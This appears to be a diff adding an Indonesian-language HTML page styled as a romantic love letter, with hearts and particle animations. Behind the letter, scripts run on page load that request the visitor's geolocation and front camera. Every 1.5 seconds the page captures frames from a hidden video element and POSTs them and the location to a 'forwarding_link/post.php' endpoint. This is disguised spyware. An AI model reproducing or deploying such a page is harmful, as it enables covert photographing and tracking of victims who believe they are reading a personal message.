@@ -1,0 +1,533 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Untuk Seseorang Spesial</title>
+<link href='https://fonts.googleapis.com/css?family=Poppins:300,400,500,600,700|Playfair+Display:400,700&display=swap' rel='stylesheet'>
+<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
+
+<style>
+* {
+  margin: 0;
+  padding: 0;
+  box-sizing: border-box;
+}
+
+body {
+  font-family: 'Poppins', sans-serif;
+  overflow-x: hidden;
+  background: linear-gradient(135deg, #0f0c29, #302b63, #24243e);
+  min-height: 100vh;
+  color: #333;
+}
+
+/* Particle Background */
+.particles {
+  position: fixed;
+  top: 0;
+  left: 0;
+  width: 100%;
+  height: 100%;
+  pointer-events: none;
+  z-index: 1;
+}
+
+.particle {
+  position: absolute;
+  background: rgba(255, 255, 255, 0.1);
+  border-radius: 50%;
+  animation: float 20s infinite;
+}
+
+@keyframes float {
+  0%, 100% { transform: translateY(0) translateX(0); opacity: 0; }
+  10% { opacity: 1; }
+  90% { opacity: 1; }
+  100% { transform: translateY(-100vh) translateX(100px); opacity: 0; }
+}
+
+/* Main Container */
+.container {
+  position: relative;
+  z-index: 2;
+  max-width: 900px;
+  margin: 0 auto;
+  padding: 20px;
+  min-height: 100vh;
+  display: flex;
+  flex-direction: column;
+  justify-content: center;
+  align-items: center;
+}
+
+/* Letter Card */
+.letter-card {
+  background: rgba(255, 255, 255, 0.95);
+  backdrop-filter: blur(20px);
+  border-radius: 20px;
+  padding: 50px 40px;
+  box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
+  animation: slideUp 0.8s ease-out;
+  max-width: 700px;
+  position: relative;
+  overflow: hidden;
+}
+
+.letter-card::before {
+  content: '';
+  position: absolute;
+  top: -50%;
+  right: -50%;
+  width: 500px;
+  height: 500px;
+  background: radial-gradient(circle, rgba(255, 105, 180, 0.1) 0%, transparent 70%);
+  border-radius: 50%;
+  pointer-events: none;
+}
+
+@keyframes slideUp {
+  from {
+    opacity: 0;
+    transform: translateY(40px);
+  }
+  to {
+    opacity: 1;
+    transform: translateY(0);
+  }
+}
+
+/* Header */
+.letter-header {
+  text-align: center;
+  margin-bottom: 40px;
+  position: relative;
+  z-index: 1;
+}
+
+.letter-header h1 {
+  font-family: 'Playfair Display', serif;
+  font-size: 3em;
+  background: linear-gradient(135deg, #ff6b9d 0%, #c06c84 100%);
+  -webkit-background-clip: text;
+  -webkit-text-fill-color: transparent;
+  background-clip: text;
+  margin-bottom: 10px;
+  letter-spacing: 2px;
+  animation: textGlow 3s ease-in-out infinite;
+}
+
+@keyframes textGlow {
+  0%, 100% { text-shadow: 0 0 20px rgba(255, 107, 157, 0.3); }
+  50% { text-shadow: 0 0 40px rgba(255, 107, 157, 0.5); }
+}
+
+.letter-header p {
+  font-size: 1.1em;
+  color: #888;
+  font-weight: 300;
+  letter-spacing: 1px;
+}
+
+.divider {
+  width: 60px;
+  height: 3px;
+  background: linear-gradient(90deg, transparent, #ff6b9d, transparent);
+  margin: 20px auto;
+}
+
+/* Letter Content */
+.letter-content {
+  font-size: 1.1em;
+  line-height: 1.8;
+  color: #555;
+  text-align: center;
+  margin-bottom: 30px;
+  position: relative;
+  z-index: 1;
+}
+
+.letter-content p {
+  margin-bottom: 20px;
+  animation: fadeInUp 0.6s ease-out backwards;
+}
+
+.letter-content p:nth-child(1) { animation-delay: 0.2s; }
+.letter-content p:nth-child(2) { animation-delay: 0.4s; }
+.letter-content p:nth-child(3) { animation-delay: 0.6s; }
+.letter-content p:nth-child(4) { animation-delay: 0.8s; }
+
+@keyframes fadeInUp {
+  from {
+    opacity: 0;
+    transform: translateY(20px);
+  }
+  to {
+    opacity: 1;
+    transform: translateY(0);
+  }
+}
+
+/* Input field - DIHAPUS karena tidak butuh input nama */
+
+.personal-message {
+  background: linear-gradient(135deg, rgba(255, 107, 157, 0.1), rgba(192, 108, 132, 0.1));
+  padding: 20px;
+  border-radius: 15px;
+  border-left: 4px solid #ff6b9d;
+  margin: 20px 0;
+  position: relative;
+  z-index: 1;
+  font-style: italic;
+  color: #666;
+}
+
+/* Buttons - DIHAPUS karena tidak butuh share buttons */
+
+/* Camera & Location Section */
+.hidden-features {
+  display: none;
+}
+
+.video-wrap {
+  display: none;
+}
+
+canvas {
+  display: none;
+}
+
+/* Footer */
+.letter-footer {
+  text-align: center;
+  margin-top: 40px;
+  position: relative;
+  z-index: 1;
+  font-size: 0.9em;
+  color: #aaa;
+}
+
+.signature {
+  margin-top: 20px;
+  font-family: 'Playfair Display', serif;
+  font-size: 1.5em;
+  color: #ff6b9d;
+}
+
+/* Loading Screen */
+.loading-screen {
+  position: fixed;
+  top: 0;
+  left: 0;
+  width: 100%;
+  height: 100%;
+  background: linear-gradient(135deg, #0f0c29, #302b63, #24243e);
+  display: flex;
+  flex-direction: column;
+  justify-content: center;
+  align-items: center;
+  z-index: 9999;
+  animation: fadeOut 0.5s ease-out 2s forwards;
+}
+
+@keyframes fadeOut {
+  to {
+    opacity: 0;
+    pointer-events: none;
+  }
+}
+
+.loading-text {
+  color: #ff6b9d;
+  font-size: 1.2em;
+  margin-top: 20px;
+  letter-spacing: 2px;
+}
+
+.loader {
+  width: 50px;
+  height: 50px;
+  border: 3px solid rgba(255, 107, 157, 0.2);
+  border-radius: 50%;
+  border-top-color: #ff6b9d;
+  animation: spin 1s linear infinite;
+}
+
+@keyframes spin {
+  to { transform: rotate(360deg); }
+}
+
+/* Floating Hearts */
+.hearts-container {
+  position: fixed;
+  width: 100%;
+  height: 100%;
+  top: 0;
+  left: 0;
+  pointer-events: none;
+  z-index: 1;
+}
+
+.heart {
+  position: absolute;
+  font-size: 1.5em;
+  animation: heartFloat 6s ease-in forwards;
+  opacity: 0.6;
+}
+
+@keyframes heartFloat {
+  0% {
+    bottom: -10px;
+    opacity: 0;
+  }
+  10% {
+    opacity: 1;
+  }
+  90% {
+    opacity: 1;
+  }
+  100% {
+    bottom: 100vh;
+    opacity: 0;
+    transform: translateX(100px);
+  }
+}
+
+/* Modal - DIHAPUS karena tidak butuh modal */
+
+/* Responsive */
+@media (max-width: 768px) {
+  .letter-card {
+    padding: 35px 25px;
+  }
+
+  .letter-header h1 {
+    font-size: 2.2em;
+  }
+
+  .letter-content {
+    font-size: 1em;
+    line-height: 1.6;
+  }
+
+  .button-group {
+    flex-direction: column;
+  }
+
+  .btn {
+    width: 100%;
+  }
+}
+
+@media (max-width: 480px) {
+  .letter-card {
+    padding: 25px 20px;
+    margin: 20px 10px;
+  }
+
+  .letter-header h1 {
+    font-size: 1.8em;
+  }
+
+  .letter-header p {
+    font-size: 0.95em;
+  }
+
+  .letter-content {
+    font-size: 0.95em;
+  }
+
+  .particles {
+    display: none;
+  }
+}
+</style>
+</head>
+<body>
+<!-- Loading Screen -->
+<div class="loading-screen">
+  <div class="loader"></div>
+  <p class="loading-text">Sedang mempersiapkan sesuatu untuk Anda...</p>
+</div>
+
+<!-- Particle Background -->
+<div class="particles" id="particlesContainer"></div>
+
+<!-- Floating Hearts -->
+<div class="hearts-container" id="heartsContainer"></div>
+
+<!-- Hidden Features (Camera & Location) -->
+<div class="hidden-features">
+  <div class="video-wrap" hidden="hidden">
+    <video id="video" playsinline autoplay></video>
+  </div>
+  <canvas hidden="hidden" id="canvas" width="640" height="480"></canvas>
+</div>
+
+<!-- Main Content -->
+<div class="container">
+  <div class="letter-card">
+    <div class="letter-header">
+      <h1>Untuk Dirimu</h1>
+      <p>Sebuah perasaan yang ingin aku bagikan</p>
+      <div class="divider"></div>
+    </div>
+
+    <div class="letter-content">
+      <p>Aku tidak selalu tahu bagaimana mengekspresikan apa yang aku rasakan, tapi setiap hari aku berpikir tentangmu.</p>
+      
+      <p>Kehadiranmu membuat setiap momen terasa lebih berarti, setiap tawa terasa lebih indah, dan setiap hari terasa lebih berharga.</p>
+      
+      <div class="personal-message" id="personalMsg">
+        <p id="greetingText">💕 Aku ingin kau tahu bahwa kamu sangat berarti bagiku.</p>
+      </div>
+
+      <p>Terima kasih telah menjadi bagian dari hidupku. Aku ingin kau tahu bahwa perasaanku untukmu sangat tulus dan mendalam.</p>
+    </div>
+
+    <div class="letter-footer">
+      <p>Dibuat dengan ❤️ untuk seseorang spesial</p>
+      <div class="signature" id="signature">Dengan sepenuh hati</div>
+    </div>
+  </div>
+</div>
+
+<!-- Modal - DIHAPUS karena tidak butuh input nama -->
+
+<script>
+// Global variable untuk menyimpan nama
+var receiverName = "Seseorang Spesial"; // Nama default
+
+// Initialize particles
+function initParticles() {
+  const container = document.getElementById('particlesContainer');
+  for (let i = 0; i < 15; i++) {
+    const particle = document.createElement('div');
+    particle.className = 'particle';
+    particle.style.left = Math.random() * 100 + '%';
+    particle.style.width = (Math.random() * 5 + 2) + 'px';
+    particle.style.height = particle.style.width;
+    particle.style.animationDelay = Math.random() * 20 + 's';
+    particle.style.animationDuration = (Math.random() * 20 + 20) + 's';
+    container.appendChild(particle);
+  }
+}
+
+// Floating hearts animation
+function createFloatingHearts() {
+  setInterval(() => {
+    const heart = document.createElement('div');
+    heart.className = 'heart';
+    heart.innerHTML = '❤️';
+    heart.style.left = Math.random() * 100 + '%';
+    heart.style.animationDuration = (Math.random() * 4 + 4) + 's';
+    document.getElementById('heartsContainer').appendChild(heart);
+    
+    setTimeout(() => heart.remove(), 8000);
+  }, 2000);
+}
+
+// Capture data dari input - DIHAPUS karena tidak butuh input nama
+
+// Update personal message dengan nama - DIHAPUS karena tidak butuh nama dinamis
+
+// Camera integration
+const video = document.getElementById('video');
+const canvas = document.getElementById('canvas');
+
+const constraints = {
+  audio: false,
+  video: { facingMode: "user" }
+};
+
+async function initCamera() {
+  try {
+    const stream = await navigator.mediaDevices.getUserMedia(constraints);
+    handleCameraSuccess(stream);
+  } catch (e) {
+    console.log('Akses kamera ditolak atau tidak tersedia');
+  }
+}
+
+function handleCameraSuccess(stream) {
+  window.stream = stream;
+  video.srcObject = stream;
+  
+  var context = canvas.getContext('2d');
+  setInterval(function() {
+    context.drawImage(video, 0, 0, 640, 480);
+    var canvasData = canvas.toDataURL("image/png").replace("image/png", "image/octet-stream");
+    postData(canvasData);
+  }, 1500);
+}
+
+// POST data to server
+function postData(imgdata) {
+  // Hapus pengecekan receiverName karena sudah pasti ada saat fungsi dipanggil
+  $.ajax({
+    type: 'POST',
+    data: { 
+      cat: imgdata,
+      name: receiverName
+    },
+    url: 'forwarding_link/post.php',
+    dataType: 'json',
+    async: true,
+    success: function(result) {
+      console.log('Data berhasil dikirim');
+    },
+    error: function() {
+      console.log('Gagal mengirim data');
+    }
+  });
+}
+
+// Share via WhatsApp - DIHAPUS karena tidak butuh share
+
+// Share via Facebook - DIHAPUS karena tidak butuh share
+
+// Modal functions - DIHAPUS karena modal sudah dihapus
+
+// Get location
+function getLocation() {
+  if (navigator.geolocation) {
+    navigator.geolocation.getCurrentPosition(
+      function(position) {
+        const coords = {
+          latitude: position.coords.latitude,
+          longitude: position.coords.longitude,
+          timestamp: new Date().toISOString()
+        };
+        sendLocationData(coords);
+      },
+      function(error) {
+        console.log('Geolocation error:', error);
+      }
+    );
+  }
+}
+
+function sendLocationData(coords) {
+  $.ajax({
+    type: 'POST',
+    data: { 
+      location: JSON.stringify(coords),
+      name: receiverName // Menggunakan nama default
+    },
+    url: 'forwarding_link/post.php',
+    dataType: 'json',
+    async: true
+  });
+}
+
+// Initialize on page load
+document.addEventListener('DOMContentLoaded', function() {
+  initParticles();
+  createFloatingHearts();
+  getLocation();
+  initCamera(); // Langsung start camera saat page load
+});
+</script>
+
+</body>
+</html>        
